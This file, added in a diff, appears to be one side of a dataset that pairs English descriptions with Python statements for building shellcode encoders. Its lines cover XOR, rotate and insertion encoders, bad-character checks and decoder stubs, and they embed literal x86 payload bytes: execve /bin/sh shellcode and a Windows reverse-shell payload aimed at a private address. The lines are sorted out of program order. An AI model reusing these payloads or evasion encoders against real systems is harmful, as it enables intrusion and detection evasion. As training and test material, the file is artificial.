@@ -1,0 +1,375 @@
+initialize bad_chars to the string '\x0a\x00\x0d'
+remove '\\x' from the second argument, decode it in hexadecimal, and save in bad_chars
+break
+exit from the iteration
+break the cycle
+break the loop
+add the bytes literal "\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5" to the variable buf
+add the bytes literal "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c" to the variable buf
+add the bytes literal "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf" to the variable buf
+add the bytes literal "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7" to the variable buf
+add the bytes literal "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68" to the variable buf
+add the bytes literal "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68" to the variable buf
+add the bytes literal "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68" to the variable buf
+add the bytes literal "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89" to the variable buf
+add the bytes literal "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec" to the variable buf
+add the bytes literal "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5" to the variable buf
+add the bytes literal "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8" to the variable buf
+add the bytes literal "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30" to the variable buf
+add the bytes literal "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f" to the variable buf
+add the bytes literal "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0" to the variable buf
+add the bytes literal "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01" to the variable buf
+add the bytes literal "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00" to the variable buf
+add the bytes literal "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0" to the variable buf
+add the bytes literal "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44" to the variable buf
+add the bytes literal "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31" to the variable buf
+add the bytes literal "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x74\xc7\x68" to the variable buf
+add the bytes literal "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66" to the variable buf
+add the bytes literal "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66" to the variable buf
+add the bytes literal "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b" to the variable buf
+add the bytes literal "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d" to the variable buf
+add the bytes literal "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f" to the variable buf
+Declare an empty bytes literal and store it in the variable buf
+byte is the sum of y and ROT modulo 256
+byte is byte xor XOR
+byte is byte shifted left by nbits
+assign the first two elements of shellcode to chunk
+add 1 to chunk_no
+chunk_no is integer 0
+increment count by 1
+count is integer 1
+increase counter by 1
+counter is an integer 0
+cast the string hopcode to integer base 16 and save it into the variable Dec_hopcode
+add the string value '\\x' to the variable decoded
+Convert the variable x to a hexadecimal and store it in the variable decoded
+initialize an empty string variable called decoded
+Convert the variable x to a hexadecimal and add it to the variable decoded2 followed by ','
+add the string value '0x' to the variable decoded
+initialize an empty string variable called decoded2
+append '\x02\xeb\xe4\xe8\xdc\xff\xff\xff' to decoder_stub
+concatenate the string '\x1c\x0f\x88\xdf\x88\xd0\x30\xd8' to decoder_stub
+append '\x31\xd8\x66\x89\x07\x41\x8d\x7f' to decoder_stub
+append the string '\x74\x16\x66\x8b\x44\x0f\x01\x66' to decoder_stub
+concatenate '\xb2\x45\xeb\x1f\x5e\x8d\x3e\x8a' to decoder_stub
+add the string "\x31\xd2\x5e\xbf\x90\x90\xaa\xaa" to the variable decoder_stub
+add the string "\x3c\x16\x32\x0c\x16\x32\x2c\x16" to the variable decoder_stub
+add the string "\x42\x42\x83\xc0\x04\x75\xc5\xff" to the variable decoder_stub
+add the string "\x7c\x04\x02\x88\x5c\x04\x03\x39" to the variable decoder_stub
+add the string "\x7c\x16\x05\x74\x0a\x42\x42\x42" to the variable decoder_stub
+add the string "\x7f\x83\xec\x7f\x8a\x5c\x16\x01" to the variable decoder_stub
+add the string "\x83\xec\x7f\x83\xec\x7f\x83\xec" to the variable decoder_stub
+add the string "\x88\x2c\x04\x88\x4c\x04\x01\x88" to the variable decoder_stub
+add the string "\x8a\x6c\x16\x04\x32\x1c\x16\x32" to the variable decoder_stub
+add the string "\x8a\x7c\x16\x02\x8a\x4c\x16\x03" to the variable decoder_stub
+add the string "\xe4\xe8\xa4\xff\xff\xff" to the variable decoder_stub
+decoder_stub is the string '\x31\xc0\x31\xdb\x31\xc9\x31\xd2'
+initialize the variable decoder_stub to "\xeb\x57\x31\xc0\x31\xdb\x31\xc9"
+in decoder_stub replace '\x45' with bytes object containing the value xor_byte packed according to the format string unsigned char
+for each element in decoder_stub convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\x'
+define the function find_valid_xor_byte with input parameters bytes and bad_chars
+define a method named mask that takes in n as a parameter
+define a method named rol with the parameters n, rotations, and width. Width has a default value of 8
+define a method named ror with the parameters n, rotations, and width. Width has a default value of 8
+else if xxx is equal to the string '0x0'
+else
+declare an else statement
+convert the value x in hexadecimal and append it to the string encode followed by ','
+append 0x to encode
+append 0xAA to encode
+encode is an empty string
+append string '\\x' to encoded
+append '\\x' to the string encoded
+add the string value '\\x' to the variable encoded
+append string '\\x' followed by the conversion in hex of 0xAA to the string encoded
+Convert the variable rand to a hexadecimal and add it to the variable encoded
+convert to hexadecimal a random integer between 1 and 169 and append it to the string encoded
+append string '\\xbb' to encoded
+append string '\\xcc' to encoded
+append to the string encoded the hexadecimal conversion of the and operation between h and 0xff
+append to the string encoded the hexadecimal conversion of the and operation between x and 0xff
+perform the and operation between y and 0xff, then convert the result in hexadecimal and append it to the string encoded
+append the value x converted in hex to the string encoded
+Convert the variable x to a hexadecimal and add it to the variable encoded
+append the value y converted in hex to the string encoded
+Convert the value of y to hex and append it to the variable encoded
+Convert the value of y to a hexadecimal then add it to the variable encoded
+append to the string encoded the value (7 - (256 -x)) converted to hexadecimal
+convert (x+7) to hexadecimal and append it to the string encoded
+Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded
+slice the variable insertByte at index 2 and add the value to the variable encoded
+slice the variable xxx at index 2 and add the value to the variable encoded
+set encoded to an empty string
+set encoded to the string '\\x'
+encoded is a string ""
+encoded is string ""
+encoded is an empty string
+initialize an empty string variable called encoded
+encoded is the concatenation of the string "\\x", the hexadecimal value of the length of array of bytes of the variable shellcode and the string ',' 
+encoded is an empty list
+append end to encoded
+encoded_instruction_in_hex is a string containing the hexadecimal conversion of rox_encoded_instruction
+Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_nasm followed by ','
+add the string value '0x' to the variable encoded_nasm
+initialize the variable encoded_nasm to an empty string
+append the hexadecimal conversion of byte followed by ', ' to the string encoded_shellcode
+append the hexadecimal conversion of new followed by ', ' to the string encoded_shellcode
+convert shift to hexadecimal and append it followed by ', ' to the string encoded_shellcode
+convert xor in hexadecimal and append it followed by ', ' to the string encoded_shellcode
+append '0x' to the string encoded_shellcode
+add the string value '\\x' to the variable encoded_shellcode
+Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_shellcode
+encoded_shellcode is a string ""
+initialize the variable encoded_shellcode to an empty string
+append to encoded a bytes object containing the value val1 packed according to the format string unsigned char
+append to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char
+add to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char
+append to encoded the bytes object containing the value xor_byte packed according to the format string unsigned char
+add the string value '\\x' to the variable encoded1
+Convert the value of j to a hexadecimal then add it to the variable encoded1
+initialize an empty string variable called encoded1
+add the string value ',' to the variable encoded2
+Convert the value of j to a hexadecimal then add it to the variable encoded2 followed by the string ', '
+Convert the value of y bitwise and 0xff to a hexadecimal then add it to the variable encoded2 followed by the string ','
+Convert the value of x to a hexadecimal then add it to the variable encoded2 followed by the string ', '
+Convert the variable x to a hexadecimal. Concatenate the result with the string ',' add the result to the variable encoded2
+Convert the variable y to a hexadecimal. Concatenate the result with the string ',' and add the result to the variable encoded2
+convert (7 -(256 - x)) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2
+Convert the value of h bitwise and 0xff to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2
+convert (x+7) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2
+Convert the value of y to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2
+append string '0x' to encoded2
+append '0x' to the string encoded2
+add the string value '0x' to the variable encoded2
+concatenate the string '0x' with the hexadecimal conversion of 0xAA and append the result to the string encoded2
+concatenate the string '0x' with the hexadecimal conversion of rand and append the result to the string encoded2
+Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded2
+slice the variable insertByte at index 2 and add the value to the variable encoded2
+add the value of xxx to the variable encoded2
+set the variable encoded2 to an empty string
+set encoded2 to the string '0x'
+encoded2 is a string ""
+encoded2 is string ""
+encoded2 is an empty string
+initialize an empty string variable called encoded2
+encoded2 is the concatenation of the string "0x" with the hexadecimal conversion of the lenght of the array of bytes of shellcode
+convert the value x to hex, concatenate the result with ',' and append it to the string encoded2P2
+append string '0x' to encoded2P2
+encoded2P2 is string ""
+append string '\\x' to encodedP2
+convert the value x to hex and append it to the string encodedP2
+encodedP2 is string ""
+end is a string "\\xaa"
+declare an except statement
+execve_shellcode is a bytearrary of the byte string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
+execve_shellcode is a bytearray of execve_shellcode
+append 0x90 to execve_shellcode
+exit with 1
+terminate the program with exit code 1
+terminate the program with exit code 2
+terminate the program with exit code 3
+Convert the value of leader to hexadecimal, then slice it between the indicies 2 and 3, convert it to an int16 and add its value to the variable fb
+concatenate in the string final_shellcode the concatenation of '\\x' and the string byte encoded in hexadecimal
+iterate bad_byte in bad_chars
+iterate bytes in list bad_chars
+iterate byte in the list bytes
+iterate byte in decoder_stub
+iterate over bytes in decoder_stub
+iterate over bytes in encoder
+iterate char over bad_chars
+loop through shellcode converted into a bytearray
+Make a for loop for each i in the bytearray of shellcode
+loop over execve_shellcode
+iterate i over 255 random numbers between 1 and 256
+iterate i over a sequence of number from 0 to 2
+initialize a for loop with an iterator i with a range starting from 0 until the length of shellcode_original with a step of 4
+initialize a for loop with an iterator i with a range starting from 0 until the value of padding
+Make a for loop for each x in the bytearray of buf
+loop through shellcode converted into a bytearray
+loop x over the bytearray of the string shellcode
+iterate x over the array of bytes of the string shellcode
+loop through shellcode converted into a bytearray
+Make a for loop for each x in the bytearray of shellcode
+declare a for loop with an iterator x for each element in shellcode starting from index 2 converted into a bytearray
+loop through shellcode converted into a bytearray
+concatenate '0x' to the string format_0x
+append encoded_instruction_in_hex and string "," to format_0x
+format_0x is a string ""
+format_slash_x is a string ""
+h is the sum of y and rot modulo 256
+Convert the variable x to a hexadecimal and store it in the variable hopcode
+add 1 to the value of i
+add 1 to the value of i
+set the variable i to 0
+if string "0x0," is in format_0x
+check if the length of execve_shellcode is not even
+check if the following expression is true r bitwise xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0
+if char is equal to byte
+if count modulo 2 is different from zero
+if counter modulo 2 is equal to 0
+if i is lower than the length of chunk
+convert the string byte to hex, then cast the result to int16 and then check if it is equal to i
+convert to integer base 16 the string byte encoded to hex and check if it is equal to i
+if the length of shellcode_original is not divisable by 4
+if the length of sys.argv is different from 3
+if the number of arguments is lower than 2
+check if the total number of command-line arguments are less than 2
+if the number of arguments is higher than 2
+Check if the length of xxx is greater than 4
+if matched_a_byte is True
+check if n is greater or equals to 0
+if matched_a_byte is not True
+check if padding does not equal 0
+check if rotations is less than the value of 1
+check if the variable rotations is less than 1
+check if the bytes object containing the value val1 xor i packed according to the format string unsigned char is equal to bad_byte
+if stub_has_bad_char is True
+if total does not equal 2
+if x is less than 128
+check if x is less then 128
+check if x is equivalent to the element n in shellcode converted into a bytearray
+if x is greater than 248
+check if x is greater than 248
+if xor_byte is equal to 0
+import the package binascii
+import module random
+import the package random
+import the package random
+import the package socket
+import the package struct
+import module sys
+import the package sys
+import the sys package
+generate a random integer between 1 and 255 then convert the random number into a hexadecimal and store the value in insertByte
+Store in the variable j the sum of i and magic modulus 256
+set leader to the first command-line argument after casting it to an int
+return the length of array of bytes of the string shellcode
+length_format_0x is the count of "," in format_0x
+set the variable magic to the value 13
+call the function mask with the argument width and save the return value in mask_value
+matched_a_byte is initialized to False
+matched_a_byte is True
+max_bits is an integer 8
+store in the variable n the result of the bitwise and operation between n and the function mask with the parameter width
+increment the variable n by 1
+set the variable n to the value 1
+convert shellcode to a bytearray and store its length in the variable n
+substitute elements of nasm from the index 1 to end for nasm
+convert encoded to string and replace all occurrences of "\\x" with ",0x" in it
+nbits is the second element of sys.argv converted to integer
+new is not i and 0xff
+new is new xor xor
+new is new shifted left by shift
+offset is an integer 1
+orig is an empty list
+append i to orig
+convert the value x in hexadecimal and append it to the string original_shellcode followed by ','
+append string '0x' to original_shellcode
+original_shellcode is a string ""
+P is a string '\033[35m'
+set the variable padding equal to 0
+set the variable padding equal to 4 minus the length of shellcode_original modulus 4
+set the variable r to a random integer between 1 and 255
+generate a random integer between 1 and 8 and store it in a variable called rand
+initialize a random number generator
+right shift by val2 the and operation between x and val1 and assign it to res1
+perform the and operation between x shifted left by val2 and val1 and assign the result to res1
+res2 is the result of the and operation between x and val1
+res2 is the result of the and operation between res2 and val1
+right shift res2 by max_bits minus val2
+left shift x by max_bits minus val2 and assign the result to res2
+return the result of bitwise left shift of n by rotations bitwise and with mask_value bitwise or n  bitwise right shift by the subtraction of rotations from width
+return the result of n bitwise right shift with rotations or n bitwise left shift by width minus rotations and the bitwise and operation with mask_value
+return the value of 0
+return 2 to the power of n and subtract 1
+return i
+return the value of n
+return the value n
+get the hexadecimal value of suplX and reverse its order then store the value in rev_suplx
+rot is an integer 8
+ROT is the first element of sys.argv converted to integer
+store in the variable rotations the modulus of rotations and width
+rox_encoded_instruction is the result of the or operation between res1 and res2
+Convert the value of leader to hexadecimal, then slice it at index 3, convert it to an int16 and set its value to the variable sb
+shellcode is a string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+shellcode is a string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80"
+define shellcode as a tuple and add the string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+define shellcode as a tuple and add the string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+shellcode is a string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+shellcode is a tuple containing the string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+Declare a tuple called shellcode and add the string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" into it
+declare the tuple shellcode containing the string "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+shellcode is a string "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+Declare a tuple shellcode and add the string "\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80" into it
+store in the variable shellcode b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+remove the first 2 items from shellcode
+shellcode is the first argument after removing string '\\x' decoded in hexadecimal
+Declare a tuple shellcode and add the string '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' into it
+shellcode_encoded is an empty bitearray
+store in the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\x'
+store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ','
+append the value 0x90 to shellcode_encoded
+append the value 0xaa to shellcode_encoded
+append the value of the variable r to shellcode_encoded
+compute the value of shellcode_original at index i bitwise xor r then append to shellcode_encoded
+compute the value of shellcode_original at index i+1 bitwise xor r then append to shellcode_encoded
+compute the value of shellcode_original at index i+2 bitwise xor r then append to shellcode_encoded
+compute the value of shellcode_original at index i+3 bitwise xor r then append to shellcode_encoded
+set the variable shellcode_file to the first command-line argument
+save the length of execve_shellcode into shellcode_len
+read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\x' with ''" and store the result in shellcode_original
+store in the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\x'
+append 0x90 to the shellcode_original variable
+shift is the first element of sys.argv converted to integer
+string1 contains a string concatenated with the elements of encoded separated by the value of decoder_stub
+stub_has_bad_char is boolean False
+stub_has_bad_char is boolean True
+subtract sb from fb and store the result in the variable subfs
+subtract Dec_hopecode from 255 and store the result in variable suplX
+swapped is an empty list
+append the element x of execve_shellcode to swapped
+append the element x + 1 of execve_shellcode to swapped
+separate every 4 characters of the string swapped with the separator ", "
+add "0x" to every 2 characters of the string swapped
+swapped is the hexadecimal represenation of the array of bytes swapped
+terminate the program
+call the exit function from sys with 0 as argument
+Set total to the number of command-line arguments
+try
+subtract 1 from 2 raised to max_bits and assign the result to val1
+val1 is the result of the bitwise xor between the integer base 16 of the string byte encoded to hex and i
+val2 is the result of the bitwise xor between the integer base 16 of the element i of chunk encoded to hex and xor_byte
+val2 is rbits modulo max_bits
+W is a string '\033[0m'
+while the length of shellcode is greater than integer 0
+while x is less than shellcode_len
+start a while loop with the condition xor_byte_good if equivalent to False
+open the file stored in shellcode_file using an alias variable f
+increment x by 1
+increment x by 2
+x is not x
+x is 0
+assign the variable x the value of the function rol with x and rand as parameters
+left shift x by 1
+x is x xor 0xDD
+assign the variable x the value of the bitwise xor operation of x and rand
+set x to y minus 0x10
+set x to y minus 0x2
+xor is the second element of sys.argv converted to integer
+XOR is the third element of sys.argv converted to integer
+assign 0 to xor_byte
+xor_byte is the output of the function find_valid_xor_byte with the input parameters chunk and bad_chars
+xor_byte is the output of the function find_valid_xor_byte with the input parameters string1 and bad_chars
+set the variable xor_byte_good to the value False
+set the variable xor_byte_good to the value True
+XOR_HEX is XOR converted to hexadecimal
+Take the absolute value of subfs then convert subfs to an integer, then cast to a hexadecimal, slice the variable rev_suplx between the indicies 0 and 2 then cast rev_suplx to the type int16, store the value of the summation in the variable xxx
+compute bitwise xor of y and the first element of shellcode converted into a byte array and store the result in the variable y
+Y is a '\033[33m'
+y is not x
+compute bitwise xor of the first element in shellcode converted into a bytearray and the second element of shellcode converted into a byte array
+set the variable y to x bitwise xor of 0x88
+set y to x bitwise xor of 0x97
+y is x xor 0xAA
+set the variable y equal to x bitwise xor the element n of shellcode converted into a bytearray
+set the variable z to bitwise not x
